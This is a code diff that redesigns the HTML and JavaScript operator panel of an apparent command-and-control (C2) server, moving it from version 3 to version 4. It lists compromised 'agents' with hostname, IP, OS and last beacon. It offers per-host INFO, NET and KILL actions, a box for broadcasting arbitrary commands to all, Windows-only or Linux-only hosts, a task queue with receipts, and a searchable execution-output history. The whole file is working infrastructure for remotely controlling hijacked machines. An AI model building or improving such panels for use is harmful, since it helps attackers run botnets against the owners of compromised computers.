@@ -2,175 +2,468 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>C2 MISSION CONTROL // V3</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 MISSION CONTROL // V4</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        :root { --accent: #00ff41; --bg: #0a0a0a; --card: #141414; --border: #252525; --text: #d0d0d0; }
-        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; padding: 2rem; }
-        
-        /* Grid Layout Fixes */
-        .dashboard-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 1.5rem; margin-bottom: 1.5rem; }
-        
-        .card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; position: relative; }
-        .text-neon { color: var(--accent); text-shadow: 0 0 10px rgba(0, 255, 65, 0.3); font-weight: 800; text-transform: uppercase; }
-        
-        /* Header Fixes */
-        .header-stats { display: flex; gap: 1rem; align-items: center; }
-        .stat-badge { border: 1px solid var(--accent); padding: 0.4rem 1rem; font-size: 0.8rem; background: rgba(0, 255, 65, 0.05); }
+        :root {
+            --accent: #00ff87;
+            --accent-soft: rgba(0, 255, 135, 0.14);
+            --bg: #070b11;
+            --panel: #0f1622;
+            --panel-2: #101b29;
+            --border: #223043;
+            --text: #d6e4ff;
+            --muted: #8495b3;
+            --danger: #ff5a67;
+            --warn: #ffc857;
+        }
 
-        /* Table Aesthetics */
-        .table { color: var(--text); border-color: var(--border); margin: 0; }
-        .table thead th { border-bottom: 2px solid var(--border); font-size: 0.7rem; color: #666; }
-        .table tbody td { border-bottom: 1px solid var(--border); padding: 12px 8px; vertical-align: middle; background: transparent !important; }
-        
-        /* Terminal / Feed */
-        .terminal-box { background: #000; border: 1px solid var(--border); height: 400px; overflow-y: auto; padding: 1rem; font-family: 'Consolas', monospace; }
-        pre { color: var(--accent); margin: 0; font-size: 0.85rem; line-height: 1.4; }
-        
-        /* Buttons */
-        .btn-action { background: transparent; border: 1px solid #444; color: #888; font-size: 0.65rem; padding: 4px 10px; border-radius: 4px; transition: all 0.2s; }
-        .btn-action:hover { border-color: var(--accent); color: var(--accent); background: rgba(0, 255, 65, 0.1); }
-        .btn-kill:hover { border-color: #ff4444 !important; color: #ff4444 !important; }
-        
-        /* Targeting Glow */
-        .target-selected { border-left: 3px solid var(--accent) !important; background: rgba(0, 255, 65, 0.02) !important; }
+        body {
+            background: radial-gradient(circle at top right, #102033 0%, var(--bg) 45%);
+            color: var(--text);
+            font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+            min-height: 100vh;
+            padding: 1.2rem;
+        }
+
+        .dashboard-shell {
+            max-width: 1680px;
+            margin: 0 auto;
+        }
+
+        .pane {
+            background: linear-gradient(180deg, var(--panel), var(--panel-2));
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1rem;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+        }
+
+        .title-neon {
+            color: var(--accent);
+            text-transform: uppercase;
+            font-weight: 800;
+            letter-spacing: 0.04em;
+            text-shadow: 0 0 10px rgba(0, 255, 135, 0.3);
+        }
+
+        .kpi {
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: #0c1520;
+            padding: 0.7rem 0.9rem;
+            min-width: 140px;
+        }
+
+        .kpi-label {
+            font-size: 0.7rem;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .kpi-value {
+            font-size: 1.2rem;
+            font-weight: 700;
+        }
+
+        .table-wrap {
+            max-height: 410px;
+            overflow-y: auto;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+        }
+
+        .table {
+            margin: 0;
+            color: var(--text);
+            --bs-table-bg: transparent;
+            --bs-table-hover-bg: rgba(255, 255, 255, 0.03);
+            --bs-table-color: var(--text);
+        }
+
+        .table th {
+            font-size: 0.72rem;
+            color: var(--muted);
+            letter-spacing: 0.06em;
+            position: sticky;
+            top: 0;
+            background: #111a27;
+            z-index: 1;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 0.4rem;
+        }
+
+        .status-online { background: var(--accent); box-shadow: 0 0 10px rgba(0, 255, 135, 0.6); }
+        .status-offline { background: var(--danger); }
+        .status-unknown { background: var(--warn); }
+
+        .chip {
+            font-size: 0.65rem;
+            padding: 0.18rem 0.45rem;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            color: var(--muted);
+            text-transform: uppercase;
+        }
+
+        .chip.windows { color: #4bb2ff; border-color: #2f73a3; }
+        .chip.linux { color: #a6ff72; border-color: #4f8136; }
+        .chip.unknown { color: #ffd66a; border-color: #8c6f24; }
+
+        .btn-action {
+            background: transparent;
+            border: 1px solid #41556f;
+            color: #b4c4de;
+            font-size: 0.68rem;
+            padding: 0.25rem 0.55rem;
+            border-radius: 6px;
+        }
+
+        .btn-action:hover { border-color: var(--accent); color: var(--accent); }
+        .btn-kill:hover { border-color: var(--danger); color: var(--danger); }
+
+        .target-selected { box-shadow: inset 3px 0 0 var(--accent); background: rgba(0, 255, 135, 0.05) !important; }
+
+        .terminal {
+            background: #06090f;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            font-family: 'Consolas', monospace;
+            max-height: 460px;
+            overflow-y: auto;
+            padding: 0.7rem;
+        }
+
+        .queue-item, .result-item {
+            border: 1px solid #1b2638;
+            border-radius: 8px;
+            padding: 0.55rem;
+            margin-bottom: 0.55rem;
+            background: #0a1019;
+        }
+
+        .result-output {
+            white-space: pre-wrap;
+            color: #7dffb0;
+            font-size: 0.8rem;
+            margin: 0.25rem 0 0;
+        }
+
+        .small-label {
+            font-size: 0.7rem;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .form-control, .form-select {
+            background: #0b1320;
+            color: var(--text);
+            border-color: #2d425d;
+        }
+
+        .form-control:focus, .form-select:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 0.15rem var(--accent-soft);
+            background: #0b1320;
+            color: var(--text);
+        }
+
+        @media (max-width: 1200px) {
+            .desktop-grid { display: block !important; }
+            .desktop-grid > * { margin-bottom: 1rem; }
+        }
     </style>
 </head>
 <body>
-
-    <div class="d-flex justify-content-between align-items-center mb-4">
-        <h2 class="text-neon m-0">Strategic Command // Core</h2>
-        <div class="header-stats">
-            <div class="stat-badge">NODES: <span id="agent-count">0</span></div>
-            <div class="stat-badge" id="clock">00:00:00</div>
+<div class="dashboard-shell">
+    <div class="d-flex justify-content-between align-items-center flex-wrap gap-3 mb-3">
+        <h2 class="title-neon m-0">Strategic Command // Mission Control v4</h2>
+        <div class="d-flex gap-2 flex-wrap">
+            <div class="kpi"><div class="kpi-label">Live Nodes</div><div class="kpi-value" id="agent-count">0</div></div>
+            <div class="kpi"><div class="kpi-label">Windows</div><div class="kpi-value" id="windows-count">0</div></div>
+            <div class="kpi"><div class="kpi-label">Linux</div><div class="kpi-value" id="linux-count">0</div></div>
+            <div class="kpi"><div class="kpi-label">Clock</div><div class="kpi-value" id="clock">00:00:00</div></div>
         </div>
     </div>
 
-    <div class="dashboard-grid">
-        <div class="card">
-            <h6 class="text-muted small mb-3">ASSET_INVENTORY</h6>
-            <table class="table">
-                <thead>
-                    <tr><th>HOSTNAME</th><th>OS</th><th>LAST_BEACON</th><th>STATUS</th><th>ACTIONS</th></tr>
-                </thead>
-                <tbody id="agent-table"></tbody>
-            </table>
-        </div>
-
-        <div class="card">
-            <div class="d-flex justify-content-between mb-3">
-                <h6 class="text-muted small">OPERATION_QUEUE</h6>
-                <span onclick="purgeQueue()" style="cursor:pointer; color:#ff4444; font-size: 0.6rem;">[CLEAR_ALL]</span>
-            </div>
-            <div id="queue-list" class="terminal-box" style="height: 300px;"></div>
-        </div>
-    </div>
-
-    <div class="card mb-4">
-        <h6 class="text-muted small mb-3">COMMAND_UPLINK</h6>
-        <form id="cmd-form">
-            <div class="row g-2">
-                <div class="col-md-3">
-                    <select name="target" id="target-select" class="form-select bg-dark text-white border-secondary">
-                        <option value="ALL">BROADCAST_ALL</option>
-                        <optgroup label="OS_GROUPS">
-                            <option value="BROADCAST_WINDOWS">WINDOWS_ALL</option>
-                            <option value="BROADCAST_LINUX">LINUX_ALL</option>
-                        </optgroup>
-                        <optgroup label="ASSETS" id="opt-assets"></optgroup>
+    <div class="desktop-grid" style="display:grid;grid-template-columns:2.2fr 1fr;gap:1rem;">
+        <div class="pane">
+            <div class="d-flex justify-content-between align-items-center flex-wrap gap-2 mb-2">
+                <h6 class="small-label m-0">Asset Inventory</h6>
+                <div class="d-flex gap-2 flex-wrap">
+                    <input id="agent-search" class="form-control form-control-sm" placeholder="Search host / OS" style="width:180px;">
+                    <select id="agent-os-filter" class="form-select form-select-sm" style="width:130px;">
+                        <option value="ALL">All OS</option>
+                        <option value="WINDOWS">Windows</option>
+                        <option value="LINUX">Linux</option>
+                        <option value="UNKNOWN">Unknown</option>
+                    </select>
+                    <select id="agent-status-filter" class="form-select form-select-sm" style="width:130px;">
+                        <option value="ALL">All Status</option>
+                        <option value="ONLINE">Online</option>
+                        <option value="OFFLINE">Offline</option>
+                        <option value="UNKNOWN">Unknown</option>
                     </select>
                 </div>
-                <div class="col-md-7">
-                    <input type="text" name="command" id="cmd-input" class="form-control bg-dark text-white border-secondary" placeholder="Awaiting manual instructions..." required>
+            </div>
+            <div class="table-wrap">
+                <table class="table table-hover table-sm align-middle">
+                    <thead><tr><th>HOSTNAME</th><th>OS TAG</th><th>LAST BEACON</th><th>STATUS</th><th>ACTIONS</th></tr></thead>
+                    <tbody id="agent-table"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="pane">
+            <div class="d-flex justify-content-between align-items-center mb-2">
+                <h6 class="small-label m-0">Operation Queue</h6>
+                <button class="btn btn-sm btn-outline-danger" onclick="purgeQueue()">Clear Queue</button>
+            </div>
+            <div id="queue-list" class="terminal" style="max-height:390px;"></div>
+        </div>
+    </div>
+
+    <div class="pane mt-3">
+        <h6 class="small-label mb-2">Command Uplink</h6>
+        <form id="cmd-form">
+            <div class="row g-2">
+                <div class="col-lg-3">
+                    <select name="target" id="target-select" class="form-select">
+                        <option value="ALL">Broadcast All</option>
+                        <optgroup label="OS Groups">
+                            <option value="BROADCAST_WINDOWS">Windows All</option>
+                            <option value="BROADCAST_LINUX">Linux All</option>
+                        </optgroup>
+                        <optgroup label="Assets" id="opt-assets"></optgroup>
+                    </select>
                 </div>
-                <div class="col-md-2">
-                    <button class="btn btn-outline-success w-100">TRANSMIT</button>
+                <div class="col-lg-7">
+                    <input type="text" name="command" id="cmd-input" class="form-control" placeholder="Awaiting operator command..." required>
+                </div>
+                <div class="col-lg-2 d-grid">
+                    <button class="btn btn-success">Transmit</button>
                 </div>
             </div>
         </form>
     </div>
 
-    <div class="card">
-        <h6 class="text-muted small mb-3">EXECUTION_LOGS</h6>
-        <div id="results-feed" class="terminal-box" style="height: 450px;"></div>
+    <div class="pane mt-3">
+        <div class="d-flex justify-content-between align-items-center flex-wrap gap-2 mb-2">
+            <h6 class="small-label m-0">Execution History</h6>
+            <div class="d-flex gap-2 flex-wrap">
+                <input id="results-search" class="form-control form-control-sm" placeholder="Search output / host" style="width:210px;">
+                <select id="results-os-filter" class="form-select form-select-sm" style="width:130px;">
+                    <option value="ALL">All OS</option>
+                    <option value="WINDOWS">Windows</option>
+                    <option value="LINUX">Linux</option>
+                    <option value="UNKNOWN">Unknown</option>
+                </select>
+                <select id="results-host-filter" class="form-select form-select-sm" style="width:170px;"><option value="ALL">All Hosts</option></select>
+            </div>
+        </div>
+        <div id="results-feed" class="terminal"></div>
     </div>
+</div>
 
-    <script>
-        let seenResultIds = new Set();
+<script>
+    const seenResultIds = new Set();
 
-        async function triggerAction(hostname, action) {
-            const formData = new FormData();
-            formData.append('hostname', hostname);
-            formData.append('action', action);
-            await fetch('/admin/action', { method: 'POST', body: formData });
-            updateDashboard();
-        }
+    function osChipClass(family) {
+        if (family === 'WINDOWS') return 'windows';
+        if (family === 'LINUX') return 'linux';
+        return 'unknown';
+    }
 
-        function selectAgent(hostname) {
-            document.getElementById('target-select').value = hostname;
-            document.getElementById('cmd-input').focus();
-            updateDashboard(); // Refresh to show highlight
-        }
-
-        async function updateDashboard() {
-            try {
-                const response = await fetch('/api/stats');
-                const data = await response.json();
-                const table = document.getElementById('agent-table');
-                const optAssets = document.getElementById('opt-assets');
-                const currentTarget = document.getElementById('target-select').value;
-
-                document.getElementById('agent-count').innerText = data.total_count;
-                table.innerHTML = ''; optAssets.innerHTML = '';
-
-                data.agents.forEach(agent => {
-                    const isWin = agent.os.toLowerCase().includes("windows");
-                    const isSelected = currentTarget === agent.hostname;
-                    
-                    table.innerHTML += `
-                        <tr class="${isSelected ? 'target-selected' : ''}">
-                            <td onclick="selectAgent('${agent.hostname}')" style="cursor:pointer"><strong>${agent.hostname}</strong></td>
-                            <td><small class="text-muted">${agent.os}</small></td>
-                            <td><small>${agent.last_seen}</small></td>
-                            <td style="color: ${agent.status === 'ONLINE' ? '#00ff41' : '#ff4444'}">● ${agent.status}</td>
-                            <td>
-                                <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'sysinfo')">INFO</button>
-                                <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'netstat')">NET</button>
-                                <button class="btn-action btn-kill" onclick="triggerAction('${agent.hostname}', 'kill')">KILL</button>
-                            </td>
-                        </tr>`;
-                    optAssets.innerHTML += `<option value="${agent.hostname}">${agent.hostname}</option>`;
-                });
-
-                // Render Queue and Results Feed (logic remains same but cleaner markup)
-                const qList = document.getElementById('queue-list');
-                qList.innerHTML = data.queue.length === 0 ? '<div class="text-center mt-5 opacity-25 small">IDLE</div>' : '';
-                data.queue.forEach(t => {
-                    qList.innerHTML += `<div class="mb-2 small"><span class="text-warning">></span> ${t.target}: <span class="text-white">${t.command}</span></div>`;
-                });
-
-                const resFeed = document.getElementById('results-feed');
-                data.results.forEach(res => {
-                    if (!seenResultIds.has(res.id)) {
-                        seenResultIds.add(res.id);
-                        const div = document.createElement('div');
-                        div.className = "mb-4 pb-2 border-bottom border-dark";
-                        div.innerHTML = `<small class="text-muted">[${res.timestamp}] ${res.hostname}</small><pre>${res.output}</pre>`;
-                        resFeed.prepend(div);
-                    }
-                });
-            } catch (e) { console.error("Poll fail", e); }
-        }
-
-        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
-        document.getElementById('cmd-form').onsubmit = async (e) => {
-            e.preventDefault();
-            await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
-            e.target.reset();
-            updateDashboard();
+    function debounce(fn, delay = 300) {
+        let timer;
+        return (...args) => {
+            clearTimeout(timer);
+            timer = setTimeout(() => fn(...args), delay);
         };
-        setInterval(updateDashboard, 3000);
+    }
+
+    async function triggerAction(hostname, action) {
+        const formData = new FormData();
+        formData.append('hostname', hostname);
+        formData.append('action', action);
+        await fetch('/admin/action', { method: 'POST', body: formData });
         updateDashboard();
-    </script>
+    }
+
+    async function purgeQueue() {
+        await fetch('/admin/purge_tasks', { method: 'POST' });
+        updateDashboard();
+    }
+
+    function selectAgent(hostname) {
+        document.getElementById('target-select').value = hostname;
+        document.getElementById('cmd-input').focus();
+        updateDashboard();
+    }
+
+    function getFilters() {
+        return {
+            agent_search: document.getElementById('agent-search').value.trim(),
+            agent_os: document.getElementById('agent-os-filter').value,
+            agent_status: document.getElementById('agent-status-filter').value,
+            results_search: document.getElementById('results-search').value.trim(),
+            results_os: document.getElementById('results-os-filter').value,
+            results_host: document.getElementById('results-host-filter').value || 'ALL',
+            results_limit: '200'
+        };
+    }
+
+    function buildQuery(paramsObj) {
+        const params = new URLSearchParams();
+        Object.entries(paramsObj).forEach(([k, v]) => {
+            if (v !== undefined && v !== null && v !== '') params.set(k, v);
+        });
+        return params.toString();
+    }
+
+    function syncResultHosts(hosts) {
+        const hostSelect = document.getElementById('results-host-filter');
+        const prev = hostSelect.value || 'ALL';
+
+        hostSelect.innerHTML = '<option value="ALL">All Hosts</option>';
+        (hosts || []).forEach(host => {
+            const opt = document.createElement('option');
+            opt.value = host;
+            opt.innerText = host;
+            hostSelect.appendChild(opt);
+        });
+
+        if ([...hostSelect.options].some(o => o.value === prev)) hostSelect.value = prev;
+    }
+
+    function renderAgents(data) {
+        const table = document.getElementById('agent-table');
+        const optAssets = document.getElementById('opt-assets');
+        const currentTarget = document.getElementById('target-select').value;
+
+        table.innerHTML = '';
+        optAssets.innerHTML = '';
+
+        if (!data.agents || data.agents.length === 0) {
+            table.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-4">No agents match current filters.</td></tr>';
+            return;
+        }
+
+        data.agents.forEach(agent => {
+            const isSelected = currentTarget === agent.hostname;
+            const statusClass = agent.status === 'ONLINE' ? 'status-online' : (agent.status === 'OFFLINE' ? 'status-offline' : 'status-unknown');
+            const osClass = osChipClass(agent.os_family);
+
+            table.innerHTML += `
+                <tr class="${isSelected ? 'target-selected' : ''}">
+                    <td style="cursor:pointer" onclick="selectAgent('${agent.hostname}')"><strong>${agent.hostname}</strong><div class="text-muted small">${agent.ip || '-'}</div></td>
+                    <td><span class="chip ${osClass}">${agent.os_family}</span><div class="small text-muted">${agent.os}</div></td>
+                    <td><small>${agent.last_seen}</small></td>
+                    <td><span class="status-dot ${statusClass}"></span>${agent.status}</td>
+                    <td>
+                        <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'sysinfo')">INFO</button>
+                        <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'netstat')">NET</button>
+                        <button class="btn-action btn-kill" onclick="triggerAction('${agent.hostname}', 'kill')">KILL</button>
+                    </td>
+                </tr>`;
+            optAssets.innerHTML += `<option value="${agent.hostname}">${agent.hostname}</option>`;
+        });
+    }
+
+    function renderQueue(queue) {
+        const qList = document.getElementById('queue-list');
+        if (!queue || queue.length === 0) {
+            qList.innerHTML = '<div class="text-center text-muted py-4">Queue empty.</div>';
+            return;
+        }
+
+        qList.innerHTML = '';
+        queue.forEach(t => {
+            const seen = (t.seen_list || []).join(', ') || 'none';
+            qList.innerHTML += `
+                <div class="queue-item small">
+                    <div><span class="text-warning">&gt;</span> ${t.target} <span class="text-muted">@ ${t.timestamp || '--:--:--'}</span></div>
+                    <div class="text-white">${t.command}</div>
+                    <div class="text-muted">Receipts: ${seen}</div>
+                </div>`;
+        });
+    }
+
+    function renderResults(results) {
+        const resFeed = document.getElementById('results-feed');
+
+        if (!results || results.length === 0) {
+            resFeed.innerHTML = '<div class="text-center text-muted py-4">No execution logs for current filters.</div>';
+            return;
+        }
+
+        resFeed.innerHTML = '';
+        results.forEach(res => {
+            seenResultIds.add(res.id);
+            const osClass = osChipClass(res.os_family);
+            const div = document.createElement('div');
+            div.className = 'result-item';
+            div.innerHTML = `
+                <div class="d-flex justify-content-between align-items-center">
+                    <div>
+                        <strong>${res.hostname}</strong> <span class="chip ${osClass}">${res.os_family}</span>
+                    </div>
+                    <small class="text-muted">${res.timestamp}</small>
+                </div>
+                <pre class="result-output">${res.output}</pre>`;
+            resFeed.appendChild(div);
+        });
+    }
+
+    async function updateDashboard() {
+        try {
+            const query = buildQuery(getFilters());
+            const response = await fetch(`/api/stats?${query}`);
+            const data = await response.json();
+
+            const stats = data.stats || {};
+            document.getElementById('agent-count').innerText = stats.online_agents ?? data.total_count ?? 0;
+            document.getElementById('windows-count').innerText = stats.windows_agents ?? 0;
+            document.getElementById('linux-count').innerText = stats.linux_agents ?? 0;
+
+            syncResultHosts(data.filters?.result_hosts || []);
+            renderAgents(data);
+            renderQueue(data.queue || []);
+            renderResults(data.results || []);
+        } catch (e) {
+            console.error('Dashboard poll failed', e);
+        }
+    }
+
+    const debouncedRefresh = debounce(updateDashboard, 250);
+    ['agent-search', 'agent-os-filter', 'agent-status-filter', 'results-search', 'results-os-filter', 'results-host-filter']
+        .forEach(id => {
+            document.getElementById(id).addEventListener('input', debouncedRefresh);
+            document.getElementById(id).addEventListener('change', debouncedRefresh);
+        });
+
+    document.getElementById('cmd-form').onsubmit = async (e) => {
+        e.preventDefault();
+        const response = await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
+        if (response.ok) e.target.reset();
+        updateDashboard();
+    };
+
+    setInterval(() => {
+        document.getElementById('clock').innerText = new Date().toLocaleTimeString();
+    }, 1000);
+
+    setInterval(updateDashboard, 3000);
+    updateDashboard();
+</script>
 </body>
 </html>
